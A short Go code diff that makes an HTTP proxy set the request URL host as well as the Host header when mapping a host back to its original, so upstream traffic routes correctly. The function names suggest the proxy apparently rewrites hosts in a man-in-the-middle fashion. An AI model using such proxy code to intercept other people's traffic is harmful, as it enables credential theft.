@@ -2701,9 +2701,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// replace "Host" header
+				// replace "Host" header AND URL host for proper upstream routing
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
+					req.URL.Host = r_host  // Critical: goproxy uses URL.Host for actual connection
 				}
 
 				// fix origin
